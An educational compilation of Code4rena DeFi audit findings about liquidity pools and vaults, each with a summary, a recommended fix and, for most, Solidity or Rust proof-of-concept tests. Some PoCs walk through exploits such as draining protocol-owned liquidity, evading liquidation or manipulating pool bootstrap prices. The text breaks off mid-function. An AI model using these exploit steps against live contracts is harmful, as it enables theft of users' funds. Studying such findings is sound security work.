# ETAAcademy-Adudit: 4. Pool

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>04. Pool</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>DeFi</th>
          <td>pool</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] Lack of Slippage Protection in withdraw/redeem Functions of the Vault

### Slippage Protection

- Summary: Users in the PrizeVault expect a 1:1 exchange ratio between assets and shares when withdrawing. However, if the underlying yield vault incurs losses, this ratio can decrease. If total assets drop below total debt while a user's withdrawal is pending, they may receive fewer assets than expected, potentially causing losses.

- Impact & Recommendation: The withdraw and redeem functions in the PrizeVault lack slippage protection, potentially leading to user losses if the underlying yield vault experiences losses. To address this, users should be able to specify slippage protection parameters, such as a minimum amount for redemption or a maximum shares input for withdrawal.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-pooltogether#m-04-lack-of-slippage-protection-in-withdrawredeem-functions-of-the-vault) & [Report](https://code4rena.com/reports/2024-03-pooltogether)

  <details><summary>POC</summary>

  ```solidity
    function previewWithdraw(uint256 _assets) public view returns (uint256) {
        uint256 _totalAssets = totalAssets();
        // No withdrawals can occur if the vault controls no assets.
        if (_totalAssets == 0) revert ZeroTotalAssets();
        uint256 totalDebt_ = totalDebt();
        if (_totalAssets >= totalDebt_) {
            return _assets;
        } else {
            // Follows the inverse conversion of `convertToAssets`
            return _assets.mulDiv(totalDebt_, _totalAssets, Math.Rounding.Up);
        }
    }
    function convertToAssets(uint256 _shares) public view returns (uint256) {
        uint256 totalDebt_ = totalDebt();
        uint256 _totalAssets = totalAssets();
        if (_totalAssets >= totalDebt_) {
            return _shares;
        } else {
            // If the vault controls fewer assets than what has been deposited, a share will be worth a
            // proportional amount of the total assets. This can happen due to fees, slippage, or loss
            // of funds in the underlying yield vault.
            return _shares.mulDiv(_totalAssets, totalDebt_, Math.Rounding.Down);
        }
    }
    function totalAssets() public view returns (uint256) {
        return yieldVault.convertToAssets(yieldVault.balanceOf(address(this))) + _asset.balanceOf(address(this));
    }

  ```

  </details>

## 2.[High] ReLPContract wrongfully assumes protocol owns all of the liquidity in the UniswapV2 pool

### Not calculations on the all liquidity

- Summary: The ReLPContract assumes it owns all liquidity in the UniswapV2 pool. When RdpxV2Core calls ReLPContract#reLP, it may pass incorrect amounts or trigger a revert if the protocol doesn't own the majority of LP balance. This is because the calculation assumes protocol owns all RDPX reserves, potentially leading to a denial-of-service if lpToRemove exceeds actual LP balance.

- Impact & Recommendation: Change the logic and base all calculations on the pair balance of `UniV2LiquidityAmo`
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-09-relpcontract-wrongfully-assumes-protocol-owns-all-of-the-liquidity-in-the-uniswapv2-pool) & [Report](https://code4rena.com/reports/2023-08-dopex)

    <details><summary>POC</summary>

  ```solidity
    function testReLpContract() public {
        testV2Amo();
        // set address in reLP contract and grant role
        reLpContract.setAddresses(
            address(rdpx),
            address(weth),
            address(pair),
            address(rdpxV2Core),
            address(rdpxReserveContract),
            address(uniV2LiquidityAMO),
            address(rdpxPriceOracle),
            address(factory),
            address(router)
        );
        reLpContract.grantRole(reLpContract.RDPXV2CORE_ROLE(), address(rdpxV2Core));
        reLpContract.setreLpFactor(9e4);
        // add liquidity
        uniV2LiquidityAMO.addLiquidity(5e18, 1e18, 0, 0);
        uniV2LiquidityAMO.approveContractToSpend(
            address(pair),
            address(reLpContract),
            type(uint256).max
        );
        rdpxV2Core.setIsreLP(true);
        (uint256 reserveA, uint256 reserveB, ) = pair.getReserves();
        weth.mint(address(2), reserveB * 10);
        rdpx.mint(address(2), reserveA * 10);
        vm.startPrank(address(2));
        weth.approve(address(router), reserveB * 10);
        rdpx.approve(address(router), reserveA * 10);
        router.addLiquidity(address(rdpx), address(weth), reserveA * 10, reserveB * 10, 0, 0, address(2), 12731316317831123);
        vm.stopPrank();

        console.log("UniV2Amo balance isn't enough and will underflow");
        uint pairBalance = pair.balanceOf(address(uniV2LiquidityAMO));
        console.log("UniV2Amo LP balance: ", pairBalance);
        vm.expectRevert("ds-math-sub-underflow");
        rdpxV2Core.bond(1 * 1e18, 0, address(this));
    }

  ```

    </details>

## 3.[High] User can evade liquidation by depositing the minimum of tokens and gain time to not be liquidated

### Liquidation by manipulating the user.cooldownExpiration variable

- Summary: The CollateralAndLiquidity contract has a critical vulnerability that lets a user avoid liquidation by manipulating the user.cooldownExpiration variable. By depositing small amounts of tokens, users can increment the cooldownExpiration, causing liquidation attempts to fail. This could lead to system debt if liquidations are avoided.

- Impact & Recommendation: Consider modifying the liquidation function
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-salty#m-05-absence-of-autonomous-mechanism-for-selling-collateral-assets-in-the-external-market-in-exchange-for-usds-will-cause-undercollateralization-during-market-crashes-and-will-cause-usds-to-depeg) & [Report](https://code4rena.com/reports/2024-01-salty)

  <details><summary>POC</summary>

  ```solidity
  // Filename: src/stable/tests/CollateralAndLiquidity.t.sol:TestCollateral
  // $ forge test --match-test "testUserLiquidationMayBeAvoided" --rpc-url https://yoururl -vv
  //
    function testUserLiquidationMayBeAvoided() public {
        // Liquidatable user can avoid liquidation
        //
        // Have bob deposit so alice can withdraw everything without DUST reserves restriction
        _depositHalfCollateralAndBorrowMax(bob);
        //
        // 1. Alice deposit and borrow the max amount
        // Deposit and borrow for Alice
        _depositHalfCollateralAndBorrowMax(alice);
        // Check if Alice has a position
        assertTrue(_userHasCollateral(alice));
        //
        // 2. Crash the collateral price
        _crashCollateralPrice();
        vm.warp( block.timestamp + 1 days );
        //
        // 3. Alice maliciously front run the liquidation action and deposit a DUST amount
        vm.prank(alice);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(PoolUtils.DUST + 1, PoolUtils.DUST + 1, 0, block.timestamp, false );
        //
        // 4. The function alice liquidation will be reverted by "Must wait for the cooldown to expire"
        vm.expectRevert( "Must wait for the cooldown to expire" );
        collateralAndLiquidity.liquidateUser(alice);
    }

  ```

  </details>

## 4.[High] When borrowers repay USDS, it is sent to the wrong address, allowing anyone to burn Protocol Owned Liquidity and build bad debt for USDS

### Bad debt from liquidations

- Summary: The Liquidizer contract burns USDS collected from users' repayments during upkeep. If there's enough USDS, it's directly burned; otherwise, Protocol Owned Liquidity (POL) is converted to USDS to cover the deficit. However, the usdsThatShouldBeBurned variable is continuously increased without increasing the Liquidizer balance, forcing it to sell POL to cover the increase. If POL is exhausted, the protocol can't cover bad debt from liquidations, negatively impacting the USDS price.

- Impact & Recommendation: An attacker can exploit this by borrowing and repaying multiple times to exhaust POL or gradually over time as users repay their USDS. Therefore consider to Send the repaid USDS to the Liquidizer.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-salty#h-06-when-borrowers-repay-usds-it-is-sent-to-the-wrong-address-allowing-anyone-to-burn-protocol-owned-liquidity-and-build-bad-debt-for-usds) & [Report](https://code4rena.com/reports/2024-01-salty)

  <details><summary>POC</summary>

  ```solidity

      function testBurnPOL() public {
        // setup
        vm.prank(address(collateralAndLiquidity));
  	usds.mintTo(address(dao), 20000 ether);
  	vm.prank(address(teamVestingWallet));
  	salt.transfer(address(dao), 10000 ether);
  	vm.prank(DEPLOYER);
  	dai.transfer(address(dao), 10000 ether);
        // create Protocol Owned Liquidity (POL)
        vm.startPrank(address(dao));
  	collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
  	collateralAndLiquidity.depositLiquidityAndIncreaseShare(dai, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
  	vm.stopPrank();
        bytes32 poolIDA = PoolUtils._poolID(salt, usds);
  	bytes32 poolIDB = PoolUtils._poolID(dai, usds);
  	assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDA), 20000 ether);
  	assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDB), 20000 ether);
        // Alice deposits collateral
        vm.startPrank(address(alice));
        wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
        weth.approve(address(collateralAndLiquidity), type(uint256).max);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(alice), weth.balanceOf(alice), 0, block.timestamp, true );

        // Alice performs multiple borrows and repayments, increasing the
        // usdsThatShouldBeBurned variable in Liquidizer
        for (uint i; i < 100; i++){
            vm.startPrank(alice);
            uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);
  	    collateralAndLiquidity.borrowUSDS( maxUSDS );
            uint256 borrowed = collateralAndLiquidity.usdsBorrowedByUsers(alice);
            collateralAndLiquidity.repayUSDS(borrowed);
        }

        vm.startPrank(address(upkeep));
        // perform upkeep multiple times to cover bad debt
        // breaks when POL is exhausted
        for(;;){
            (, uint reserve1) = pools.getPoolReserves(dai, usds);
            if(reserve1 * 99 / 100 < 100) break;
            liquidizer.performUpkeep();
        }
        assertGt(liquidizer.usdsThatShouldBeBurned(), usds.balanceOf(address(liquidizer)));
    }


  ```

  </details>

## 5.[Medium] Vault.claimRewards can break if Convex changes the operator

### Convex protocol shutdown

- Summary: The Convex protocol allows for a shutdown scenario that doesn't disrupt the BaseRewardPool, but the Vault implementation overlooks this possibility. That means if the operator changes in the Convex protocol, CVX tokens may not be minted as expected, causing the claim to fail and preventing the payout of CRV and extra rewards.

- Impact & Recommendation: Verify the CVX balance of the vault before and after the claim to ensure the correct amount has been minted.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-07-amphora#m-01-vaultclaimrewards-can-break-if-convex-changes-the-operator) & [Report](https://code4rena.com/reports/2023-07-amphora)

  <details><summary>POC</summary>

  ```solidity
  ...
  _totalCvxReward += _calculateCVXReward(_crvReward);
  ...
  // Claim AMPH tokens depending on how much CRV and CVX was claimed
  _amphClaimer.claimAmph(this.id(), _totalCvxReward, _totalCrvReward, _msgSender());
  ...
  if (_totalCvxReward > 0) CVX.transfer(_msgSender(), _totalCvxReward);

  function mint(address _to, uint256 _amount) external {
    if(msg.sender != operator){
        //dont error just return. if a shutdown happens, rewards on old system
        //can still be claimed, just wont mint cvx
        return;
    }

  ```

  </details>

## 6.[Medium] When Convex pool is shut down while collateral type is CurveLPStakedOnConvex, users unable to deposit that asset and protocol lose the ability to accept the asset as collateral further

### Convex protocol shutdown

- Summary: When a Convex pool associated with a collateral type is shut down, users can no longer deposit that asset into a vault due to reverts on Convex booster deposit function. Without a method to update it, the protocol loses the ability to accept it as collateral, and users may face liquidation risks. The same issue arises if Convex itself shuts down their booster contract.

- Impact & Recommendation: Update collateral type to Single and pool id to 0 when a pool or booster contract shuts down. This prevents manual staking and skips Convex deposit. Adjust withdrawERC20 to set isTokenStaked to false when withdrawing all assets, avoiding failed liquidation.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-07-amphora#m-03-when-convex-pool-is-shut-down-while-collateral-type-is-curvelpstakedonconvex-users-unable-to-deposit-that-asset-and-protocol-lose-the-ability-to-accept-the-asset-as-collateral-further-) & [Report](https://code4rena.com/reports/2023-07-amphora)

  <details><summary>POC</summary>

  ```solidity
    import {CommonE2EBase} from '@test/e2e/Common.sol';
    import {IERC20} from 'isolmate/interfaces/tokens/IERC20.sol';
    import {IVault} from '@interfaces/core/IVault.sol';
    interface IBoosterAdmin {
    function poolManager() external view returns (address);
    function shutdownPool(uint256 _pid) external;
    }
    contract VaultCollateralTypeVulnPoC is CommonE2EBase {
    function setUp() public override {
        super.setUp();
    }
    function testCannotDepositWhenConvexPoolIsShutDown() public {
        // Prepare Convex LP for user
        deal(USDT_LP_ADDRESS, bob, 2 ether);
        // User mints vault
        IVault bobVault = IVault(vaultController.vaultIdVaultAddress(_mintVault(bob)));
        // User deposit Convex LP to vault
        vm.startPrank(bob);
        IERC20(USDT_LP_ADDRESS).approve(address(bobVault), 1 ether);
        bobVault.depositERC20(USDT_LP_ADDRESS, 1 ether);
        vm.stopPrank();
        // Convex pool of the asset is shut down
        vm.prank(IBoosterAdmin(address(BOOSTER)).poolManager());
        IBoosterAdmin(address(BOOSTER)).shutdownPool(1);
        // User can no longer deposit that LP to vault
        vm.startPrank(bob);
        IERC20(USDT_LP_ADDRESS).approve(address(bobVault), 1 ether);
        vm.expectRevert('pool is closed');
        bobVault.depositERC20(USDT_LP_ADDRESS, 1 ether);
        vm.stopPrank();
    }
    }

  ```

  </details>

## 7. [High] Early user can break pool via inflation attack due to no minimum liquidity check in the incentive contract

### Inflation attack by no minimum liquidity

- Summary: The incentive contract's absence of a minimum liquidity requirement allows users to exploit an inflation attack. By withdrawing most shares, claiming rewards, and depositing a small amount, users can inflate total shares without increasing reward inflation. This leads to older users losing rewards, especially impactful in low liquidity pools.

- Impact: Implementing a minimum liquidity limit to prevent significant rounding errors caused by dangerously low liquidity.

<br> 🐬: [Source](https://code4rena.com/reports/2024-03-acala#h-02-early-user-can-break-pool-via-inflation-attack-due-to-no-minimum-liquidity-check-in-the-incentive-contract) & [Report](https://code4rena.com/reports/2024-03-acala)

<details><summary>POC</summary>

```rust
    U256::from(add_amount.to_owned().saturated_into::<u128>())
        .saturating_mul(total_reward.to_owned().saturated_into::<u128>().into())
        .checked_div(initial_total_shares.to_owned().saturated_into::<u128>().into())
        .unwrap_or_default()
        .as_u128()
        .saturated_into()

```

</details>

## 8. [High] Users who deposited MIM and USDB tokens into BlastOnboarding may incur losses when the pool is created via bootstrap

### Differences in token pair

- Summary: BlastOnboarding's createPool function allows attackers to exploit differences in locked amounts of MIM and USDB tokens, leading to manipulation of token prices and potential fund theft. By strategically adjusting reserves through token sales, attackers can profit at the expense of other users.

- Impact & Recommendation: Mitigation measures could include ensuring consistent reserves and targets for the initial depositor or implementing small swaps twice during pool creation to address this issue.

<br> 🐬: [Source](https://code4rena.com/reports/2024-03-abracadabra-money#h-03-users-who-deposited-mim-and-usdb-tokens-into-blastonboarding-may-incur-losses-when-the-pool-is-created-via-bootstrap) & [Report](https://code4rena.com/reports/2024-03-abracadabra-money)

<details><summary>POC</summary>

```solidity
    import {PMMPricing} from "/mimswap/libraries/PMMPricing.sol";
    function testBenefitFromBoot() public {
            uint256 mimLocked = 1000 ether;
            uint256 usdbLocked = 3000 ether;
            mim.mint(address(alice), mimLocked);
            deal(address(weth), address(alice), usdbLocked);
            vm.startPrank(alice);
            mim.approve(address(router), mimLocked);
            weth.approve(address(router), usdbLocked);
            /**
             * uint256 baseAmount = totals[MIM].locked;
             * uint256 quoteAmount = totals[USDB].locked;
             * (pool, totalPoolShares) = router.createPool(MIM, USDB, FEE_RATE, I, K, address(this), baseAmount, quoteAmount);
             */
            (address pool, ) = router.createPool(address(mim), address(weth), MIN_LP_FEE_RATE, 1 ether, 500000000000000, address(alice), mimLocked, usdbLocked);
            MagicLP lp = MagicLP(pool);
            vm.stopPrank();
            console2.log("**** Starting state ****");
            console2.log('base reserve    ==>  ', toolkit.formatDecimals(lp._BASE_RESERVE_()));
            console2.log('base target     ==>  ', toolkit.formatDecimals(lp._BASE_TARGET_()));
            console2.log('quote reserve   ==>  ', toolkit.formatDecimals(lp._QUOTE_RESERVE_()));
            console2.log('quote target    ==>  ', toolkit.formatDecimals(lp._QUOTE_TARGET_()));
            bool isForTesting = true;
            uint256 wethForBob = 1000 ether;
            if (isForTesting) {
                deal(address(weth), address(bob), wethForBob);
                vm.startPrank(bob);
                weth.approve(address(router), wethForBob);
                router.sellQuoteTokensForTokens(address(lp), bob, wethForBob, 0, type(uint256).max);
                vm.stopPrank();
            } else {
                mim.mint(bob, 0.1 ether);
                deal(address(weth), address(bob), 0.1 ether);
                vm.startPrank(bob);
                mim.approve(address(router), 0.1 ether);
                router.sellBaseTokensForTokens(address(lp), bob, 0.1 ether, 0, type(uint256).max);
                weth.approve(address(router), 0.1 ether);
                router.sellQuoteTokensForTokens(address(lp), bob, 0.1 ether, 0, type(uint256).max);
                vm.stopPrank();
            }
            console2.log("**** After selling the Quote token ****");
            console2.log('base reserve    ==>  ', toolkit.formatDecimals(lp._BASE_RESERVE_()));
            console2.log('base target     ==>  ', toolkit.formatDecimals(lp._BASE_TARGET_()));
            console2.log('quote reserve   ==>  ', toolkit.formatDecimals(lp._QUOTE_RESERVE_()));
            console2.log('quote target    ==>  ', toolkit.formatDecimals(lp._QUOTE_TARGET_()));
            if (isForTesting) {
                PMMPricing.PMMState memory state = lp.getPMMState();
                console2.log("**** Prior to selling the Base token ****");
                console2.log("changed base target   ==>  ", state.B0);
                // Bob is going to sell state.B0 - state.B base tokens
                uint256 mimForSell = state.B0 - state.B;
                mim.mint(address(bob), mimForSell);
                vm.startPrank(bob);
                mim.approve(address(router), mimForSell);
                router.sellBaseTokensForTokens(address(lp), bob, mimForSell, 0, type(uint256).max);
                vm.stopPrank();
                // Initially, Bob possesses wethForBob USDB and mimForSell MIM tokens
                console2.log('Benefits for Bob  ==>  ', toolkit.formatDecimals(mim.balanceOf(bob) + weth.balanceOf(bob) - mimForSell - wethForBob));
                // Users deposited usdbLocked USDB and mimLocked MIM tokens
                console2.log('Loss of protocol  ==>  ', toolkit.formatDecimals(mimLocked + usdbLocked - mim.balanceOf(address(lp)) - weth.balanceOf(address(lp))));
            }
    }

```

</details>

## 9. [Medium] Lack of freeze authority check for collateral tokens on create trading pool

### Solana freeze authority

- Summary: SPL tokens used as collateral in the protocol can have a freeze authority, making accounts vulnerable to being frozen. The protocol lacks a check for freeze authority on SPL tokens, risking frozen accounts that can lock funds and cause DoS issues for both borrowers and lenders.

- Impact & Recommendation: Ensure that the collateral token does not have an active freeze authority. If the freeze authority is set to None, the freezing feature is permanently disabled.

<br> 🐬: [Source](https://code4rena.com/reports/2024-04-lavarage#m-01-lack-of-freeze-authority-check-for-collateral-tokens-on-create-trading-pool) & [Report](https://code4rena.com/reports/2024-04-lavarage)

## 10.[Medium] The Main Invariant “Fees paid to a given user should not exceed the amount of fees earned by the liquidity owned by that user.” can be broken due to slight difference when computing collected fee

### Fee calculation

- Summary: The main invariant "Fees paid to a given user should not exceed the amount of fees earned by the liquidity owned by that user" can be broken due to a slight difference in fee computation methods, especially for some tokens with low decimals but worth a lot. **Uniswap V3 Calculation:** `(currFeeGrowth - prevFeeGrowth) * liquidity / Q128` ; **Panoptic Calculation:** `(currFeeGrowth * liquidity / Q128) - (prevFeeGrowth * liquidity / Q128)`

- Impact & Recommendation: Introduce a whitelist to support only those pools where this issue is not significant.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-11-panoptic#m-03-the-main-invariant-fees-paid-to-a-given-user-should-not-exceed-the-amount-of-fees-earned-by-the-liquidity-owned-by-that-user-can-be-broken-due-to-slight-difference-when-computing-collected-fee) & [Report](https://code4rena.com/reports/2023-11-panoptic)

<details><summary>POC</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import {stdMath} from "forge-std/StdMath.sol";
import {Errors} from "@libraries/Errors.sol";
import {Math} from "@libraries/Math.sol";
import {PanopticMath} from "@libraries/PanopticMath.sol";
import {CallbackLib} from "@libraries/CallbackLib.sol";
import {TokenId} from "@types/TokenId.sol";
import {LeftRight} from "@types/LeftRight.sol";
import {IERC20Partial} from "@testUtils/IERC20Partial.sol";
import {TickMath} from "v3-core/libraries/TickMath.sol";
import {FullMath} from "v3-core/libraries/FullMath.sol";
import {FixedPoint128} from "v3-core/libraries/FixedPoint128.sol";
import {IUniswapV3Pool} from "v3-core/interfaces/IUniswapV3Pool.sol";
import {IUniswapV3Factory} from "v3-core/interfaces/IUniswapV3Factory.sol";
import {LiquidityAmounts} from "v3-periphery/libraries/LiquidityAmounts.sol";
import {SqrtPriceMath} from "v3-core/libraries/SqrtPriceMath.sol";
import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";
import {PositionKey} from "v3-periphery/libraries/PositionKey.sol";
import {ISwapRouter} from "v3-periphery/interfaces/ISwapRouter.sol";
import {SemiFungiblePositionManager} from "@contracts/SemiFungiblePositionManager.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {PositionUtils} from "../testUtils/PositionUtils.sol";
import {UniPoolPriceMock} from "../testUtils/PriceMocks.sol";
import {ReenterMint, ReenterBurn} from "../testUtils/ReentrancyMocks.sol";
import {IUniswapV3Pool} from "univ3-core/interfaces/IUniswapV3Pool.sol";
contract LiquidityProvider {
    IERC20 constant token0 = IERC20(0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd);
    IERC20 constant token1 = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    function uniswapV3MintCallback(
        uint256 amount0Owed,
        uint256 amount1Owed,
        bytes calldata data
    ) external {
        if (amount0Owed > 0) token0.transfer(msg.sender, amount0Owed);
        if (amount1Owed > 0) token1.transfer(msg.sender, amount1Owed);
    }
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        IERC20 token = amount0Delta > 0 ? token0 : token1;
        uint256 amountToPay = amount0Delta > 0 ? uint256(amount0Delta) : uint256(amount1Delta);
        token.transfer(msg.sender, amountToPay);
    }
    function arbitraryCall(bytes calldata data, address pool) public {
        (bool success, ) = pool.call(data);
        require(success);
    }
}
contract CollectFee is Test {
    address constant GeminiUSDCPool = 0x5aA1356999821b533EC5d9f79c23B8cB7c295C61;
    address constant GeminiUSD = 0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    LiquidityProvider Alice;
    uint160 internal constant MIN_V3POOL_SQRT_RATIO = 4295128739;
    uint160 internal constant MAX_V3POOL_SQRT_RATIO =
        1461446703485210103287273052203988822378723970342;
    uint256 mainnetFork;
    struct Info {
        uint128 liquidity;
        uint256 feeGrowthInside0LastX128;
        uint256 feeGrowthInside1LastX128;
        uint128 tokensOwed0;
        uint128 tokensOwed1;
    }
    function setUp() public {
        // Use your own RPC to fork the mainnet
        mainnetFork = vm.createFork(
            "Your RPC"
        );
        vm.selectFork(mainnetFork);
        Alice = new LiquidityProvider();
        deal(USDC, address(Alice), 1000000 * 1e6);
        vm.startPrank(address(Alice));
        IERC20(USDC).approve(GeminiUSDCPool, type(uint256).max);
        vm.stopPrank();
    }
    function testFeeCollectionBreakInvariant() public {
        // First swap to get some GeminiUSD balance
        bytes memory AliceSwapData = abi.encodeWithSignature(
            "swap(address,bool,int256,uint160,bytes)",
            address(Alice),
            false,
            int256(20000 * 1e6),
            MAX_V3POOL_SQRT_RATIO - 1,
            ""
        );
        Alice.arbitraryCall(AliceSwapData, GeminiUSDCPool);
        // Then mint some position for Alice, the desired liquidity is 10000000000
        bytes memory AliceMintData = abi.encodeWithSignature(
            "mint(address,int24,int24,uint128,bytes)",
            address(Alice),
            92100,
            92200,
            10000000000,
            ""
        );
        Alice.arbitraryCall(AliceMintData, GeminiUSDCPool);
        // Now we retrieve the initial feeGrowth for token0(Gemini USD) after minting the position for Alice
        (
            uint128 liquidity,
            uint256 prevFeeGrowthInside0LastX128,
            uint256 prevFeeGrowthInside1LastX128,
            ,
        ) = IUniswapV3Pool(GeminiUSDCPool).positions(
                keccak256(abi.encodePacked(address(Alice), int24(92100), int24(92200)))
            );
        // Then we perform two swaps (both from Gemini USD to USDC, first amount is 4800 USD then 5000 USD)
        AliceSwapData = abi.encodeWithSignature(
            "swap(address,bool,int256,uint160,bytes)",
            address(Alice),
            true,
            int256(4800 * 1e2),
            MIN_V3POOL_SQRT_RATIO + 1,
            ""
        );
        Alice.arbitraryCall(AliceSwapData, GeminiUSDCPool);
        AliceSwapData = abi.encodeWithSignature(
            "swap(address,bool,int256,uint160,bytes)",
            address(Alice),
            true,
            int256(5000 * 1e2),
            MIN_V3POOL_SQRT_RATIO + 1,
            ""
        );
        Alice.arbitraryCall(AliceSwapData, GeminiUSDCPool);
        // We burn the position of Alice to update feeGrowth for Gemini USD
        bytes memory AliceBurnData = abi.encodeWithSignature(
            "burn(int24,int24,uint128)",
            int24(92100),
            int24(92200),
            uint128(10000000000)
        );
        Alice.arbitraryCall(AliceBurnData, GeminiUSDCPool);
        // Now we retrieve the updated feeGrowth for token0(Gemini USD)
        (
            uint256 newliquidity,
            uint256 currFeeGrowthInside0LastX128,
            uint256 currFeeGrowthInside1LastX128,
            ,
        ) = IUniswapV3Pool(GeminiUSDCPool).positions(
                keccak256(abi.encodePacked(address(Alice), int24(92100), int24(92200)))
            );
        // This is how UniV3 compute collected fee: (currFee - prevFee) * liquidity / Q128
        console.log("Univ3 fee obtained: ");
        uint256 collectFee = ((currFeeGrowthInside0LastX128 - prevFeeGrowthInside0LastX128) *
            10000000000) / (2 ** 128);
        console.log(collectFee);
        console.log("Panoptic fee1 record: ");
        uint256 collectFee1 = (currFeeGrowthInside0LastX128 * 10000000000) / (2 ** 128);
        console.log("Panoptic fee2 record: ");
        uint256 collectFee2 = (prevFeeGrowthInside0LastX128 * 10000000000) / (2 ** 128);
        // This is how Panoptic compute collected fee: currFee * liquidity / Q128 - prevFee * liquidity / Q128
        console.log("Panoptic way to calculate collected fee: ");
        console.log(collectFee1 - collectFee2);
        // Then we ensure the fee calculated by Panoptic is larger than UniV3
        assertGt(collectFee1 - collectFee2, collectFee);
    }
}


```

</details>

## 11.[Medium] Panoptic pool can be non-profitable by specific Uniswap governance

### Swap commission

- Summary: The Panoptic pool can become non-profitable due to specific Uniswap governance changes affecting the swap commission calculation. If Uniswap introduces a fee below 0.01%, the Panoptic protocol's swap commission calculation may result in zero, leading to potential loss of profitability for the Panoptic pool.

- Impact & Recommendation: Use Uniswap’s DECIMALS (1e6) instead of 10_000 to ensure the swap commission is accurately calculated even with very low fee percentages.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-panoptic#m-05-panoptic-pool-can-be-non-profitable-by-specific-uniswap-governance) & [Report](https://code4rena.com/reports/2024-04-panoptic)

<details><summary>POC</summary>

```solidity

    function startToken(
        bool underlyingIsToken0,
        address token0,
        address token1,
        uint24 fee,
        PanopticPool panopticPool
    ) external {

        __SNIP__
        // cache the pool fee in basis points
        uint24 _poolFee;
        unchecked {
            _poolFee = fee / 100; // @audit below fee 0.01%, then _poolFee = 0
        }
        s_poolFee = _poolFee;
        ...
        __SNIP__
        // Additional risk premium charged on intrinsic value of ITM positions
        unchecked {
            s_ITMSpreadFee = uint128((ITM_SPREAD_MULTIPLIER * _poolFee) / DECIMALS);
        }
    }

```

</details>

## 12.[Medium] Users might be enforced to buy the token from Dex through Tornado which goes against the protocol design

### Buying from Dex

- Summary: In the `Router.sol` contract, users may unintentionally be forced to buy tokens from a decentralized exchange (Dex) through Tornado when the market's WETH reserve reaches its maximum (`MAX_WETH_RESERVE`). This issue can occur either when the market closes after reaching the maximum reserve or when it remains open but users end up buying from Dex automatically.

- Impact & Recommendation: A flag should be added allowing users to opt out of buying from Dex if the reserve limit is reached.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-tornado-launcher-proleague#m-3-Users-might-be-enforced-to-buy-the-token-from-Dex -through-Tornado-which-goes-against-the-protocol-design) & [Report](https://code4rena.com/reports/2024-06-tornado-launcher-proleague)

## 13.[High] Most users won’t be able to claim their share of Uniswap fees

### Unable to claim Uniswap fees

- Summary: The `ILOPool.sol` contract's `claim()` function collects all owed tokens at once, including burnt liquidity and fees for all positions, causing most users to be unable to claim their Uniswap fees. This results in subsequent `claim()` calls containing no Uniswap fees, as they have already been sent to the fee taker, leading to transaction reverts.

- Impact & Recommendation: Modify the `claim()` function to only collect tokens corresponding to the specific `tokenId` position, ensuring that subsequent users can claim their share.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-vultisig#h-01-Most-users-won’t-be-able-to-claim-their-share-of-Uniswap-fees) & [Report](https://code4rena.com/reports/2024-06-vultisig)

<details><summary>POC</summary>

```solidity

function testClaimFeesRevert() external {
    _launch();
    vm.warp(VEST_START_0 + 10);
    uint256 tokenId = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR, 0);
    uint256 tokenId2 = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR_2, 0);
    IUniswapV3Pool uniV3Pool = IUniswapV3Pool(projectId);
    // INVESTOR and INVESTOR_2 burn their liquidity and obtain their tokens
    vm.prank(INVESTOR);
    IILOPool(iloPool).claim(tokenId);
    vm.prank(INVESTOR_2);
    IILOPool(iloPool).claim(tokenId2);
    // Generate some fees via a flash loan
    uniV3Pool.flash(address(this), 1e8, 1e8, "");
    // INVESTOR claims their corresponding part of the fees
    // Only the first one to claim has better odds of claiming successfully
    vm.prank(INVESTOR);
    IILOPool(iloPool).claim(tokenId);
    // INVESTOR_2 can't claim their part of the fees as the transaction will revert
    // It reverts with ST (SafeTransfer) as it is trying to transfer tokens the contract doesn't have
    // The fees for INVESTOR_2 were already taken
    vm.prank(INVESTOR_2);
    vm.expectRevert(bytes("ST"));
    IILOPool(iloPool).claim(tokenId2);
    // Generate more fees
    uniV3Pool.flash(address(this), 1e6, 1e6, "");
    // Even if some new fees are available, they might not be enough to pay back the owed ones to INVESTOR_2
    vm.prank(INVESTOR_2);
    vm.expectRevert(bytes("ST"));
    IILOPool(iloPool).claim(tokenId2);
}
function uniswapV3FlashCallback(uint256, uint256, bytes memory) external {
    deal(USDC, address(this), IERC20(USDC).balanceOf(address(this)) * 2);
    deal(SALE_TOKEN, address(this), IERC20(SALE_TOKEN).balanceOf(address(this)) * 2);
    IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
